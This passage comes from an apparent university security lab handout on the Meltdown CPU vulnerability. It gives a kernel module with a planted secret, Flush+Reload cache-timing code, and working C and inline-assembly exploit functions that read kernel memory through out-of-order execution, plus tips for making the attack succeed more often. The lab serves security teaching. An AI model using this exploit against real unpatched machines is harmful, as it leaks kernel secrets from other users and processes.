                         <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">memcpy</span><span class="p">(</span><span class="n">secret_buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">secret</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>              
   <span class="k">return</span> <span class="mi">8</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">test_proc_fops</span> <span class="o">=</span>
<span class="p">{</span>
   <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
   <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">test_proc_open</span><span class="p">,</span>
   <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">read_proc</span><span class="p">,</span>
   <span class="p">.</span><span class="n">llseek</span> <span class="o">=</span> <span class="n">seq_lseek</span><span class="p">,</span>
   <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">single_release</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">__init</span> <span class="kt">int</span> <span class="nf">test_proc_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
   <span class="c1">// write message in kernel message buffer</span>
   <span class="n">printk</span><span class="p">(</span><span class="s">&quot;secret data address:%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">secret</span><span class="p">);</span>      

   <span class="n">secret_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">vmalloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

   <span class="c1">// create data entry in /proc</span>
   <span class="n">secret_entry</span> <span class="o">=</span> <span class="n">proc_create_data</span><span class="p">(</span><span class="s">&quot;secret_data&quot;</span><span class="p">,</span> 
                  <span class="mo">0444</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">test_proc_fops</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">secret_entry</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

   <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">__exit</span> <span class="kt">void</span> <span class="nf">test_proc_cleanup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">remove_proc_entry</span><span class="p">(</span><span class="s">&quot;secret_data&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">test_proc_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">test_proc_cleanup</span><span class="p">);</span>
</pre></div>
</div>
</div>
<p>Two important conditions need to be held, or Meltdown attacks will be
quite difficult to succeed. In our kernel module, we ensure that the
conditions are met:</p>
<ul class="simple">
<li>We need to know the address of the target secret data. The kernel
module saves the address of the secret data into the kernel message
buffer&nbsp;(Line ②), which is public accessible; we will get the address
from there. In real Meltdown attacks, attackers have to figure out a
way to get the address, or they have to guess.</li>
<li>The secret data need to be cached, or the attack’s success rate will
be low. The reason for this condition will be explained later. To
achieve this, we just need to use the secret once. We create a data
entry <code class="docutils literal notranslate"><span class="pre">/proc/secret_data</span></code> &nbsp;(Line ③), which provides a window for
user-level programs to interact with the kernel module. When a
user-level program reads from this entry, the <code class="docutils literal notranslate"><span class="pre">read_proc()</span></code>
function in the kernel module will be invoked, inside which, the
secret variable will be loaded&nbsp;(Line ①) and thus be cached by the CPU.
It should be noted that <code class="docutils literal notranslate"><span class="pre">read_proc()</span></code> does not return the secret
data to the user space, so it does not leak the secret data. We still
need to use the Meltdown attack to get the secret.</li>
</ul>
<div class="section" id="compilation-and-execution">
<h4>Compilation and execution.<a class="headerlink" href="#compilation-and-execution" title="Permalink to this headline">¶</a></h4>
<p>Download the code from the lab website, and go to the directory that
contains <em>Makefile</em> and <em>MeltdownKernel.c</em>. Type the <code class="docutils literal notranslate"><span class="pre">make</span></code> command to
compile the kernel module. To install this kernel module, use the
<code class="docutils literal notranslate"><span class="pre">insmod</span></code> command. Once we have successfully installed the kernel
module, we can use the <code class="docutils literal notranslate"><span class="pre">dmesg</span></code> command to find the secret data’s
address from the kernel message buffer. Take a note of this address, as
we need it later.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ make
$ sudo insmod MeltdownKernel.ko
$ dmesg | grep &#39;secret data address&#39;
secret data address: 0xfb61b000
</pre></div>
</div>
</div>
</div>
<div class="section" id="task-4-access-kernel-memory-from-user-space">
<h3>Task 4: Access Kernel Memory from User Space<a class="headerlink" href="#task-4-access-kernel-memory-from-user-space" title="Permalink to this headline">¶</a></h3>
<p>Now we know the address of the secret data, let us do an experiment to
see whether we can directly get the secret from this address or not. You
can write your own code for this experiment. We provide a code sample in
the following. For the address in Line ①, you should replace it with the
address obtained from the previous task. Compile and run this program
(or your own code) and describe your observation. Will the program
succeed in Line ②? Can the program execute Line ②?</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>int main()
{
  char *kernel_data_addr = (char*)0xfb61b000;  (*@\ding{192}@*)
  char kernel_data = *kernel_data_addr;        (*@\ding{193}@*)
  printf(&quot;I have reached here.\n&quot;);            (*@\ding{194}@*)
  return 0;
}
</pre></div>
</div>
</div>
<div class="section" id="task-5-handle-error-exceptions-in-c">
<h3>Task 5: Handle Error/Exceptions in C<a class="headerlink" href="#task-5-handle-error-exceptions-in-c" title="Permalink to this headline">¶</a></h3>
<p>From Task 4, you have probably learned that accessing a kernel memory
from the user space will cause the program to crash. In the Meltdown
attack, we need to do something after accessing the kernel memory, so we
cannot let the program crash. Accessing prohibited memory location will
raise a SIGSEGV signal; if a program does not handle this exception by
itself, the operating system will handle it and terminate the program.
That is why the program crashes. There are several ways to prevent
programs from crashing by a catastrophic event. One way is to define our
own signal handler in the program to capture the exceptions raised by
catastrophic events.</p>
<p>Unlike C++ or other high-level languages, C does not provide direct
support for error handling&nbsp;(also known as exception handling), such as
the try/catch clause. However, we can emulate the try/catch clause using
<code class="docutils literal notranslate"><span class="pre">sigsetjmp()</span></code> and <code class="docutils literal notranslate"><span class="pre">siglongjmp()</span></code>. We provide a C program called
<code class="docutils literal notranslate"><span class="pre">ExceptionHandling.c</span></code> in the following to demonstrate how a program
can continue to execute even if there is a critical exception, such as
memory access violation. Please run this code, and describe your
observations.</p>
<div class="literal-block-wrapper docutils container" id="id13">
<span id="listing-4"></span><div class="code-block-caption"><span class="caption-text">Listing 4: ExceptionHandling.c</span><a class="headerlink" href="#id13" title="Permalink to this code">¶</a></div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;setjmp.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp"></span>

<span class="k">static</span> <span class="n">sigjmp_buf</span> <span class="n">jbuf</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">catch_segv</span><span class="p">()</span>
<span class="p">{</span>
  <span class="c1">// Roll back to the checkpoint set by sigsetjmp().</span>
  <span class="n">siglongjmp</span><span class="p">(</span><span class="n">jbuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>                         
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span> 
  <span class="c1">// The address of our secret data</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_data_addr</span> <span class="o">=</span> <span class="mh">0xfb61b000</span><span class="p">;</span>

  <span class="c1">// Register a signal handler</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">catch_segv</span><span class="p">);</span>                     

  <span class="k">if</span> <span class="p">(</span><span class="n">sigsetjmp</span><span class="p">(</span><span class="n">jbuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>                
     <span class="c1">// A SIGSEGV signal will be raised. </span>
     <span class="kt">char</span> <span class="n">kernel_data</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">kernel_data_addr</span><span class="p">;</span> 

     <span class="c1">// The following statement will not be executed.</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Kernel data at address %lu is: %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> 
                    <span class="n">kernel_data_addr</span><span class="p">,</span> <span class="n">kernel_data</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Memory access violation!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Program continues to execute.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<p>The exception handling mechanism in the above code is quite complicated,
so we provide further explanation in the following:</p>
<ul class="simple">
<li>Set up a signal handler: we register a <code class="docutils literal notranslate"><span class="pre">SIGSEGV</span></code> signal handler in
Line ②, so when a <code class="docutils literal notranslate"><span class="pre">SIGSEGV</span></code> signal is raised, the handler function
<code class="docutils literal notranslate"><span class="pre">catch_segv()</span></code> will be invoked.</li>
<li>Set up a checkpoint: after the signal handler has finished processing
the exception, it needs to let the program continue its execution
from particular checkpoint. Therefore, we need to define a checkpoint
first. This is achieved via <code class="docutils literal notranslate"><span class="pre">sigsetjmp()</span></code> in Line ③:
<code class="docutils literal notranslate"><span class="pre">sigsetjmp(jbuf,</span> <span class="pre">1)</span></code> saves the stack context/environment in
<code class="docutils literal notranslate"><span class="pre">jbuf</span></code> for later use by <code class="docutils literal notranslate"><span class="pre">siglongjmp()</span></code>; it returns 0 when the
checkpoint is set up&nbsp;<a class="reference internal" href="#id4">|4|</a>.</li>
<li>Roll back to a checkpoint: When <code class="docutils literal notranslate"><span class="pre">siglongjmp(jbuf,</span> <span class="pre">1)</span></code> is called,
the state saved in the <code class="docutils literal notranslate"><span class="pre">jbuf</span></code> variable is copied back in the
processor and computation starts over from the return point of the
<code class="docutils literal notranslate"><span class="pre">sigsetjmp()</span></code> function, but the returned value of the
<code class="docutils literal notranslate"><span class="pre">sigsetjmp()</span></code> function is the second argument of the
<code class="docutils literal notranslate"><span class="pre">siglongjmp()</span></code> function, which is <code class="docutils literal notranslate"><span class="pre">1</span></code> in our case. Therefore,
after the exception handling, the program continues its execution
from the <code class="docutils literal notranslate"><span class="pre">else</span></code> branch.</li>
<li>Triggering the exception: The code at Line ④ will trigger a <code class="docutils literal notranslate"><span class="pre">SIGSEGV</span></code>
signal due to the memory access violation (user-level programs cannot
access kernel memory).</li>
</ul>
</div>
</div>
<div class="section" id="task-6-out-of-order-execution-by-cpu">
<h2>Task 6: Out-of-Order Execution by CPU<a class="headerlink" href="#task-6-out-of-order-execution-by-cpu" title="Permalink to this headline">¶</a></h2>
<p>From the previous tasks, we know that if a program tries to read kernel
memory, the access will fail and an exception will be raised. Using the
following code as an example, we know that Line 3 will raise an
exception because the memory at address <code class="docutils literal notranslate"><span class="pre">0xfb61b000</span></code> belongs to the
kernel. Therefore, the execution will be interrupted at Line 3, and Line
4 will never be executed, so the value of the <code class="docutils literal notranslate"><span class="pre">number</span></code> variable will
still be 0.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>1  number = 0;
2  *kernel_address = (char*)0xfb61b000;
3  kernel_data = *kernel_address;
4  number = number + kernel_data;
</pre></div>
</div>
<p>The above statement about the code example is true when looking from
outside of the CPU. However, it is not completely true if we get into
the CPU, and look at the execution sequence at the microarchitectural
level. If we do that, we will find out that Line 3 will successfully get
the kernel data, and Line 4 and subsequent instructions will be
executed. This is due to an important optimization technique adopted by
modern CPUs. It is called out-of-order execution.</p>
<p>Instead of executing the instructions strictly in their original order,
modern high performance CPUs allow out-of-order execution to exhaust all
of the execution units. Executing instructions one after another may
lead to poor performance and inefficient resources usage, i.e., current
instruction is waiting for previous instruction to complete even though
some execution units are idle&nbsp;<a class="reference internal" href="#id2">|2|</a>. With
the out-of-order execution feature, CPU can run ahead once the required
resources are available.</p>
<p>In the code example above, at the microarchitectural level, Line 3
involves two operations: load the data (usually into a register), and
check whether the data access is allowed or not. If the data is already
in the CPU cache, the first operation will be quite fast, while the
second operation may take a while. To avoid waiting, the CPU will
continue executing Line 4 and subsequent instructions, while conducting
the access check in parallel. This is out-of-order execution. The
results of the execution will not be committed before the access check
finishes. In our case, the check fails, so all the results caused by the
out-of-order execution will be discarded like it has never happened.
That is why from outside we do not see that Line 4 was executed.
<strong>Figure&nbsp;3</strong> illustrates the out-of-order
execution caused by Line 3 of the sample code.</p>
<div class="align-center figure" id="id14">
<img alt="Out-of-order execution inside CPU" src="../../_images/meltdown.jpg" />
<p class="caption"><span class="caption-text">Figure 3: Out-of-order execution inside CPU</span></p>
</div>
<p>Intel and several CPU makers made a severe mistake in the design of the
out-of-order execution. They wipe out the effects of the out-of-order
execution on registers and memory if such an execution is not supposed
to happen, so the execution does not lead to any visible effect.
However, they forgot one thing, the effect on CPU caches. During the
out-of-order execution, the referenced memory is fetched into a register
and is also stored in the cache. If the out-of-order execution has to be
discarded, the cache caused by such an execution should also be
discarded. Unfortunately, this is not the case in most CPUs. Therefore,
it creates an observable effect. Using the side-channel technique
described in Tasks 1 and 2, we can observe such an effect. The Meltdown
attack cleverly uses this observable effect to find out secret values
inside the kernel memory.</p>
<p>In this task, we use an experiment to observe the effect caused by an
out-of-order execution. The code for this experiment is shown below. In
the code, Line ① will cause an exception, so Line ② will not be executed.
However, due to the out-of-order execution, Line ② is executed by the CPU,
but the result will eventually be discarded. However, because of the
execution, <code class="docutils literal notranslate"><span class="pre">array[7</span> <span class="pre">*</span> <span class="pre">4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> will now be cached by CPU. We use
the side-channel code implemented in Tasks 1 and 2 to check whether we
can observe the effect. Please download the code from the lab website,
run it and describe your observations. In particular, please provide an
evidence to show that Line ② is actually executed.</p>
<div class="literal-block-wrapper docutils container" id="id15">
<span id="listing-5"></span><div class="code-block-caption"><span class="caption-text">Listing 5: MeltdownExperiment.c</span><a class="headerlink" href="#id15" title="Permalink to this code">¶</a></div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;setjmp.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>

<span class="cm">/*********************** Flush + Reload ************************/</span>
<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
<span class="cm">/* cache hit time threshold assumed*/</span>
<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
<span class="cp">#define DELTA 1024</span>

<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

  <span class="c1">//flush the values of the array from cache</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">reloadSideChannel</span><span class="p">()</span> 
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
     <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
     <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
     <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">){</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">&quot;array[%d*4096 + %d] is in cache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">DELTA</span><span class="p">);</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The Secret = %d.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
     <span class="p">}</span>
  <span class="p">}</span>	
<span class="p">}</span>
<span class="cm">/*********************** Flush + Reload ************************/</span>

<span class="kt">void</span> <span class="nf">meltdown</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_data_addr</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">kernel_data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   
  <span class="c1">// The following statement will cause an exception</span>
  <span class="n">kernel_data</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">kernel_data_addr</span><span class="p">;</span>     
  <span class="n">array</span><span class="p">[</span><span class="mi">7</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>          
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">meltdown_asm</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_data_addr</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">char</span> <span class="n">kernel_data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   
   <span class="c1">// Give eax register something to do</span>
   <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
       <span class="s">&quot;.rept 400;&quot;</span>                
       <span class="s">&quot;add $0x141, %%eax;&quot;</span>
       <span class="s">&quot;.endr;&quot;</span>                    
    
       <span class="o">:</span>
       <span class="o">:</span>
       <span class="o">:</span> <span class="s">&quot;eax&quot;</span>
   <span class="p">);</span> 
    
   <span class="c1">// The following statement will cause an exception</span>
   <span class="n">kernel_data</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">kernel_data_addr</span><span class="p">;</span>  
   <span class="n">array</span><span class="p">[</span><span class="n">kernel_data</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>           
<span class="p">}</span>

<span class="c1">// signal handler</span>
<span class="k">static</span> <span class="n">sigjmp_buf</span> <span class="n">jbuf</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">catch_segv</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">siglongjmp</span><span class="p">(</span><span class="n">jbuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="c1">// Register a signal handler</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">catch_segv</span><span class="p">);</span>

  <span class="c1">// FLUSH the probing array</span>
  <span class="n">flushSideChannel</span><span class="p">();</span>
    
  <span class="k">if</span> <span class="p">(</span><span class="n">sigsetjmp</span><span class="p">(</span><span class="n">jbuf</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">meltdown</span><span class="p">(</span><span class="mh">0xfb61b000</span><span class="p">);</span>                
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Memory access violation!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// RELOAD the probing array</span>
  <span class="n">reloadSideChannel</span><span class="p">();</span>                     
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<p>It should be noted that the address in Line ③ should be replaced by the
actual address that you found from the kernel module. Compile and run
the code (see <strong>Section&nbsp;2</strong>) for the
instructions on the compilation). Document and explain your
observations.</p>
</div>
<div class="section" id="task-7-the-basic-meltdown-attack">
<h2>Task 7: The Basic Meltdown Attack<a class="headerlink" href="#task-7-the-basic-meltdown-attack" title="Permalink to this headline">¶</a></h2>
<p>The out-of-order execution creates an opportunity for us to read data
from the kernel memory, and then use the data to conduct operations that
can cause observable effects on the CPU cache. How far a CPU can go in
the out-of-order execution depends on how slow the access check, which
is done in parallel, is performed. This is a typical race condition
situation. In this task, we will exploit this race condition to steal a
secret from the kernel.</p>
<div class="section" id="task-7-1-a-naive-approach">
<h3>Task 7.1: A Naive Approach<a class="headerlink" href="#task-7-1-a-naive-approach" title="Permalink to this headline">¶</a></h3>
<p>In the previous task, we can get <code class="docutils literal notranslate"><span class="pre">array[7</span> <span class="pre">*</span> <span class="pre">4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> into the
CPU cache. Although we can observe that effect, we do not get any useful
information about the secret. If instead of using
<code class="docutils literal notranslate"><span class="pre">array[7</span> <span class="pre">*</span> <span class="pre">4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code>, we access
<code class="docutils literal notranslate"><span class="pre">array[kernel_data</span> <span class="pre">*</span> <span class="pre">4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code>, which brings it into the CPU
cache. Using the FLUSH+RELOAD technique, we check the access time of
<code class="docutils literal notranslate"><span class="pre">array[i*4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> for <code class="docutils literal notranslate"><span class="pre">i</span> <span class="pre">=</span> <span class="pre">0,</span> <span class="pre">\ldots,</span> <span class="pre">255</span></code>. If we find out
that only <code class="docutils literal notranslate"><span class="pre">array[k*4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> is in the cache, we can infer that
the value of the <code class="docutils literal notranslate"><span class="pre">kernel_data</span></code> is <code class="docutils literal notranslate"><span class="pre">k</span></code>. Please try this approach by
modifying <code class="docutils literal notranslate"><span class="pre">MeltdownExperiment.c</span></code> shown in
<a class="reference internal" href="#listing-3">Listing 3</a>.
Please describe your observations. Even if your attack is not
successful, you should note down your observation, and continue on to
Task 7.2, which is intended to improve the attack.</p>
</div>
<div class="section" id="task-7-2-improve-the-attack-by-getting-the-secret-data-cached">
<h3>Task 7.2: Improve the Attack by Getting the Secret Data Cached<a class="headerlink" href="#task-7-2-improve-the-attack-by-getting-the-secret-data-cached" title="Permalink to this headline">¶</a></h3>
<p>Meltdown is a race condition vulnerability, which involves the racing
between the out-of-order execution and the access check. The faster the
out-of-order execution is, the more instructions we can execute, and the
more likely we can create an observable effect that can help us get the
secret. Let us look see how we can make the out-of-order execution
faster.</p>
<p>The first step of the out-of-order execution in our code involves
loading the kernel data into a register. At the same time, the security
check on such an access is performed. If the data loading is slower than
security check, i.e., when the security check is done, the kernel data
is still on its way from the memory to the register, the out-of-order
execution will be immediately interrupted and discarded, because the
access check fails. Our attack will fail as well.</p>
<p>If the kernel data is already in the CPU cache, loading the kernel data
into a register will be much faster, and we may be able to get to our
critical instruction, the one that loads the array, before the failed
check aborts our out-of-order execution. In practice, if a kernel data
item is not cached, using Meltdown to steal the data will be difficult.
However, as it has been demonstrated, Meltdown attacks can still be
successful, but they require high-performance CPU and
DRAM&nbsp;<a class="reference internal" href="#id5">|5|</a>.</p>
<p>In this lab, we will get the kernel secret data cached before launching
the attack. In the kernel module shown in
<a class="reference internal" href="#listing-3">Listing 3</a>,
we let user-level program to invoke a function inside the kernel module.
This function will access the secret data without leaking it to the
user-level program. The side effect of this access is that the secret
data is now in the CPU cache. We can add the code to our attack program
used in Task 7.1, before triggering the out-of-order execution. Please
run your modified attack program and see whether your success rate is
improved or not.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// Open the /proc/secret_data virtual file.
int fd = open(&quot;/proc/secret_data&quot;, O_RDONLY);
if (fd &lt; 0) {
    perror(&quot;open&quot;);
    return -1;
}

int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
</pre></div>
</div>
</div>
<div class="section" id="task-7-3-using-assembly-code-to-trigger-meltdown">
<h3>Task 7.3: Using Assembly Code to Trigger Meltdown<a class="headerlink" href="#task-7-3-using-assembly-code-to-trigger-meltdown" title="Permalink to this headline">¶</a></h3>
<p>You probably still cannot succeed in the previous task, even with secret
data being cached by CPU. Let us do one more improvement by adding a few
lines of assembly instructions before the kernel memory access. See the
code in <code class="docutils literal notranslate"><span class="pre">meltdown_asm()</span></code> below. The code basically do a loop for 400
times (see Line ①); inside the loop, it simply add a number <code class="docutils literal notranslate"><span class="pre">0x141</span></code> to
the <code class="docutils literal notranslate"><span class="pre">eax</span></code> register. This code basically does useless computations, but
according to a post discussion, these extra lines of code “give the
algorithmic units something to chew while memory access is being
speculated”&nbsp;<a class="reference internal" href="#id1">|1|</a>. This is an important trick to
increase the possibility of success.</p>
<div class="literal-block-wrapper docutils container" id="id16">
<span id="listing-6"></span><div class="code-block-caption"><span class="caption-text">Listing 6: meltdown_asm()</span><a class="headerlink" href="#id16" title="Permalink to this code">¶</a></div>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>void meltdown_asm(unsigned long kernel_data_addr)
   {
      char kernel_data = 0;
      
      // Give eax register something to do
      asm volatile(
          &quot;.rept 400;&quot;                  (*@\ding{192}@*)
          &quot;add $0x141, %%eax;&quot;
          &quot;.endr;&quot;                      (*@\ding{193}@*)
       
          :
          :
          : &quot;eax&quot;
      ); 
       
      // The following statement will cause an exception
      kernel_data = *(char*)kernel_data_addr;  
      array[kernel_data * 4096 + DELTA] += 1;              
   }
</pre></div>
</div>
</div>
<p>Please call the <code class="docutils literal notranslate"><span class="pre">meltdown_asm()</span></code> function, instead of the original
<code class="docutils literal notranslate"><span class="pre">meltdown()</span></code> function. Describe your observations. Increase and
decrease the number of loops, and report your results.</p>
</div>
</div>
<div class="section" id="task-8-make-the-attack-more-practical">
<h2>Task 8: Make the Attack More Practical<a class="headerlink" href="#task-8-make-the-attack-more-practical" title="Permalink to this headline">¶</a></h2>
<p>Even with the optimization in the previous task, we may still not be
able get the secret data every time: sometimes, our attack produces the
correct secret value, but sometimes, our attack fails to identify any
value or identifies a wrong value. To improve the accuracy, we can use a
statistical technique. The idea is create a score array of size 256, one
element for each possible secret value. We then run our attack for
multiple times. Each time, if our attack program says that <code class="docutils literal notranslate"><span class="pre">k</span></code> is the
